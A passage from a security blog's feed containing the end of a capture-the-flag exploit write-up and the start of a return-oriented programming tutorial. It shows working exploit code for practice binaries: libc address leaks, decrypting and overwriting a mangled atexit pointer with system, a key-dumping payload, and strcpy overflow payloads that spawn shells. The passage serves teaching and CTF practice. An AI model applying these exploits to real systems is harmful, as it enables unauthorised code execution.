pointer to &lt;code&gt;&amp;lt;address&amp;gt;&lt;/code&gt;, we can get the contents of the second message to read 
from that address and edit the contents of the second message to write to that
address.&lt;/p&gt;
&lt;p&gt;Once we have the program base, we use our arbitrary read primitive to leak a
&lt;code&gt;libc&lt;/code&gt; address. We know it is an Ubuntu machine, so we download a couple versions
of &lt;code&gt;libc&lt;/code&gt; and compare the address to the symbol in each of the versions to match
the correct &lt;code&gt;libc&lt;/code&gt; version. We can now overwrite &lt;code&gt;free&lt;/code&gt; with &lt;code&gt;system&lt;/code&gt; and delete
our message to get a shell!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;free_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;arbitrary_read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prog_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x4f2c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;head&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;prog_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x5160&lt;/span&gt;
&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;free_addr&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x781b0&lt;/span&gt;
&lt;span class="n"&gt;system_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x3d170&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Except this didn't work - the program had full RELRO support, so the GOT was
read only. &lt;/p&gt;
&lt;p&gt;To get around this, we had to do some painful stuff. We noticed a directory
traversal attack in the login function, and though we could use that to put the
key into the heap (and read it later). Unfortunately, the &lt;code&gt;malloc&lt;/code&gt;
implementation  seemed to clobber the key after it freed the blob. Instead, 
our strategy
was to overwrite an &lt;code&gt;atexit&lt;/code&gt; handler function pointer located in &lt;code&gt;libc&lt;/code&gt; with the
address of &lt;code&gt;system&lt;/code&gt; and to overwrite the argument for this handler with a buffer
we controlled. Unfortunately, this function pointer was encrypted. To decrypt, 
we computed what the function pointer was supposed to be by leaking an address 
from &lt;code&gt;ld.so&lt;/code&gt; and using the address and the encrypted value to calculate the key.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;rtld_global_ro_address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;arbitrary_read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1a0ef8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;ld_base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;rtld_global_ro_address&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x20ca0&lt;/span&gt;
&lt;span class="n"&gt;ld_fini_address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ld_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0xf270&lt;/span&gt;
&lt;span class="n"&gt;encrypted_atexit_handler&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;arbitrary_read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1a21ec&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;xor_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ror&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted_atexit_handler&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;ld_fini_address&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We then encrypted our target address with this key, update the function pointer
to use our new address and updated the argument to point to a buffer we
controlled&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;encrypted_system&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;rol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;system_addr&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;xor_key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;arbitrary_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1a21ec&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;encrypted_system&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;arbitrary_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1a21f0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;obj0&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x110&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To trigger our exploit, we just sent the disconnect message (which fortunately 
didn't disconnect the socket). For our final exploit, we used the payload 
&lt;code&gt;cat key &amp;gt;&amp;amp;4&lt;/code&gt; to dump the key to the already open socket.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python gitsmsg.py
&lt;span class="go"&gt;Deleting messages ...&lt;/span&gt;
&lt;span class="go"&gt;Performing overflow ...&lt;/span&gt;
&lt;span class="go"&gt;Editing ...&lt;/span&gt;
&lt;span class="go"&gt;Getting ...&lt;/span&gt;
&lt;span class="go"&gt;Getting libc base ...&lt;/span&gt;
&lt;span class="go"&gt;Getting ld base ...&lt;/span&gt;
&lt;span class="go"&gt;Writing encrypted function pointer ...&lt;/span&gt;
&lt;span class="go"&gt;The key is: lol, tagged unions for the WIN!&lt;/span&gt;
&lt;span class="go"&gt;*** Connection closed by remote host ***&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="ctf"></category><category term="exploitation"></category></entry><entry><title>Introduction to return oriented programming (ROP)</title><link href="http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html" rel="alternate"></link><published>2013-05-28T00:00:00-07:00</published><updated>2013-05-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-28:/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html</id><summary type="html">&lt;p&gt;A brief introduction to Return Oriented Programming (ROP) exploits.&lt;/p&gt;</summary><content type="html">&lt;h1&gt;What is ROP?&lt;/h1&gt;
&lt;p&gt;Return Oriented Programming (ROP) is a powerful technique used to counter common exploit prevention strategies. In particular, ROP is useful for circumventing Address Space Layout Randomization (ASLR)&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt; and DEP&lt;sup id="fnref-2"&gt;&lt;a class="footnote-ref" href="#fn-2"&gt;2&lt;/a&gt;&lt;/sup&gt;. When using ROP, an attacker uses his/her control over the stack right before the return from a function to direct code execution to some other location in the program. Except on very hardened binaries, attackers can easily find a portion of code that is located in a fixed location (circumventing ASLR) and which is executable (circumventing DEP). Furthermore, it is relatively straightforward to chain several payloads to achieve (almost) arbitrary code execution. &lt;/p&gt;
&lt;h1&gt;Before we begin&lt;/h1&gt;
&lt;p&gt;If you are attempting to follow along with this tutorial, it might be helpful
to have a Linux machine you can compile and run 32 bit code on. If you install
the correct libraries, you can compile 32 bit code on a 64 bit machine with the
&lt;code&gt;-m32&lt;/code&gt; flag via &lt;code&gt;gcc -m32 hello_world.c&lt;/code&gt;. I will target this tutorial mostly at
32 bit programs because ROP on 64 bit follows the same principles, but is just
slightly more technically challenging. For the purpose of this tutorial, I will
assume that you are familiar with x86 C calling conventions and stack
management. I will attempt to provide a brief explanation
&lt;a href="http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html"&gt;here&lt;/a&gt;, but you are encouraged to explore
in more depth on your own. Lastly, you should be familiar with a unix command
line interface.&lt;/p&gt;
&lt;h1&gt;My first ROP&lt;/h1&gt;
&lt;p&gt;The first thing we will do is use ROP to call a function in a very simple binary. In particular, we will be attempting to call &lt;code&gt;not_called&lt;/code&gt; in the following program&lt;sup id="fnref-3"&gt;&lt;a class="footnote-ref" href="#fn-3"&gt;3&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;not_called&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Enjoy your shell!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We disassemble the program to learn the information we will need in order to exploit it: the size of the buffer and the address of &lt;code&gt;not_called&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) disas vulnerable_function &lt;/span&gt;
&lt;span class="go"&gt;Dump of assembler code for function vulnerable_function:&lt;/span&gt;
&lt;span class="go"&gt;   0x08048464 &amp;lt;+0&amp;gt;:  push   %ebp&lt;/span&gt;
&lt;span class="go"&gt;   0x08048465 &amp;lt;+1&amp;gt;:  mov    %esp,%ebp&lt;/span&gt;
&lt;span class="go"&gt;   0x08048467 &amp;lt;+3&amp;gt;:  sub    $0x88,%esp&lt;/span&gt;
&lt;span class="go"&gt;   0x0804846d &amp;lt;+9&amp;gt;:  mov    0x8(%ebp),%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x08048470 &amp;lt;+12&amp;gt;: mov    %eax,0x4(%esp)&lt;/span&gt;
&lt;span class="go"&gt;   0x08048474 &amp;lt;+16&amp;gt;: lea    -0x6c(%ebp),%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x08048477 &amp;lt;+19&amp;gt;: mov    %eax,(%esp)&lt;/span&gt;
&lt;span class="go"&gt;   0x0804847a &amp;lt;+22&amp;gt;: call   0x8048340 &amp;lt;strcpy@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x0804847f &amp;lt;+27&amp;gt;: leave  &lt;/span&gt;
&lt;span class="go"&gt;   0x08048480 &amp;lt;+28&amp;gt;: ret   &lt;/span&gt;
&lt;span class="go"&gt;End of assembler dump.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) print not_called&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x8048444 &amp;lt;not_called&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We see that &lt;code&gt;not_called&lt;/code&gt; is at &lt;code&gt;0x8048444&lt;/code&gt; and the buffer &lt;code&gt;0x6c&lt;/code&gt; bytes long. Right before the call to &lt;code&gt;strcpy@plt&lt;/code&gt;, the stack in fact looks like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;argument&amp;gt;          |
| &amp;lt;return address&amp;gt;    |
| &amp;lt;old %ebp&amp;gt;          | &amp;lt;= %ebp
| &amp;lt;0x6c bytes of      |
|       ...           |
|       buffer&amp;gt;       |
| &amp;lt;argument&amp;gt;          |
| &amp;lt;address of buffer&amp;gt; | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since we want our payload to overwrite the return address, we provide 0x6c bytes to fill the buffer, 4 bytes to replace the old &lt;code&gt;%ebp&lt;/code&gt;, and the target address (in this case, the address of &lt;code&gt;not_called&lt;/code&gt;). Our payload looks like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| 0x8048444 &amp;lt;not_called&amp;gt;     |
| 0x42424242 &amp;lt;fake old %ebp&amp;gt; |
| 0x41414141 ...             |
|   ... (0x6c bytes of &amp;#39;A&amp;#39;s) |
|   ... 0x41414141           |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We try this and we get our shell&lt;sup id="fnref-4"&gt;&lt;a class="footnote-ref" href="#fn-4"&gt;4&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\x44\x84\x04\x08&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;Enjoy your shell!&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Calling arguments&lt;/h1&gt;
&lt;p&gt;Now that we can return to an arbitrary function, we want to be able to pass arbitrary arguments. We will exploit this simple program&lt;sup id="fnref-3"&gt;&lt;a class="footnote-ref" href="#fn-3"&gt;3&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;not_used&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;not_called&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Not quite a shell...&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This time, we cannot simply return to &lt;code&gt;not_called&lt;/code&gt;. Instead, we want to call &lt;code&gt;system&lt;/code&gt; with the correct argument. First, we print out the values we need using &lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;
&lt;!--
[^6]: There are other ways to do this. `nm` is a popular choice for printing the symbols in a binary, but I don't know

wzxhzdk:6

--&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) pring &amp;#39;system@plt&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x8048360 &amp;lt;system@plt&amp;gt;
&lt;span class="go"&gt;(gdb) x/s not_used&lt;/span&gt;
&lt;span class="go"&gt;0x8048580:   &amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In order to call &lt;code&gt;system&lt;/code&gt; with the argument &lt;code&gt;not_used&lt;/code&gt;, we have to set up the stack. Recall, right after &lt;code&gt;system&lt;/code&gt; is called it expects the stack to look like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;argument&amp;gt;       |
| &amp;lt;return address&amp;gt; |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We will construct our payload such that the stack looks like a call to &lt;code&gt;system(not_used)&lt;/code&gt; immediately after the return. We thus make our payload:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| 0x8048580 &amp;lt;not_used&amp;gt;             |
| 0x43434343 &amp;lt;fake return address&amp;gt; |
| 0x8048360 &amp;lt;address of system&amp;gt;    |
| 0x42424242 &amp;lt;fake old %ebp&amp;gt;       |
| 0x41414141 ...                   |
|   ... (0x6c bytes of &amp;#39;A&amp;#39;s)       |
|   ... 0x41414141                 |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We try this and get out shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\x60\x83\x04\x08&amp;quot; + &amp;quot;CCCC&amp;quot; + &amp;quot;\x80\x85\x04\x08&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Return to &lt;code&gt;libc&lt;/code&gt;&lt;/h1&gt;
&lt;p&gt;So far, we've only been looking at contrived binaries that contain the pieces we need for our exploit. Fortunately, ROP is still fairly straightforward without this handicap. The trick is to realize that programs that use functions from a shared library, like &lt;code&gt;printf&lt;/code&gt; from &lt;code&gt;libc&lt;/code&gt;, will link &lt;em&gt;the entire library&lt;/em&gt; into their address space at run time. This means that even if they never call &lt;code&gt;system&lt;/code&gt;, the code for &lt;code&gt;system&lt;/code&gt; (and every other function in &lt;code&gt;libc&lt;/code&gt;) is accessible at runtime. We can see this fairly easy in &lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;ulimit&lt;/span&gt; -s unlimited
&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) break main&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x8048404&lt;/span&gt;
&lt;span class="go"&gt;(gdb) run&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /home/ppp/a.out &lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x08048404 in main ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) print system&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x555d2430 &amp;lt;system&amp;gt;
&lt;span class="go"&gt;(gdb) find 0x555d2430, +999999999999, &amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;0x556f3f18&lt;/span&gt;
&lt;span class="go"&gt;warning: Unable to access target memory at 0x5573a420, halting search.&lt;/span&gt;
&lt;span class="go"&gt;1 pattern found.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This example illustrates several important tricks. First, the use of &lt;code&gt;ulimit -s unlimited&lt;/code&gt; which will disable library randomization on 32-bit programs. Next, we must run the program and break at main, after libraries are loaded, to print values in shared libraries (but after we do so, then even functions unused by the program are available to us). Last, the &lt;code&gt;libc&lt;/code&gt; library actually contains the string &lt;code&gt;/bin/sh&lt;/code&gt;, which we can find with &lt;code&gt;gdb&lt;/code&gt;&lt;sup id="fnref-7"&gt;&lt;a class="footnote-ref" href="#fn-7"&gt;5&lt;/a&gt;&lt;/sup&gt; use for exploits!&lt;/p&gt;
&lt;p&gt;It is fairly straightforward to plug both of these addresses into our previous exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\x30\x24\x5d\x55&amp;quot; + &amp;quot;CCCC&amp;quot; + &amp;quot;\x18\x3f\x6f\x55&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Chaining gadgets&lt;/h1&gt;
&lt;p&gt;With ROP, it is possible to do far more powerful things than calling a single function. In fact, we can use it to run arbitrary code&lt;sup id="fnref-8"&gt;&lt;a class="footnote-ref" href="#fn-8"&gt;6&lt;/a&gt;&lt;/sup&gt; rather than just calling functions we have available to us. We do this by returning to &lt;em&gt;gadgets&lt;/em&gt;, which are short sequences of instructions ending in a &lt;code&gt;ret&lt;/code&gt;. For example, the following pair of gadgets can be used to write an arbitrary value to an arbitrary location: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ecx&lt;/span&gt;
&lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%eax&lt;/span&gt;
&lt;span class="nf"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nv"&gt;%eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%ecx&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nf"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;These work by &lt;code&gt;pop&lt;/code&gt;ing values from the stack (which we control) into registers and then executing code that uses them. To use, we set up the stack like so:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;address of mov %eax, (%ecx)&amp;gt;        |
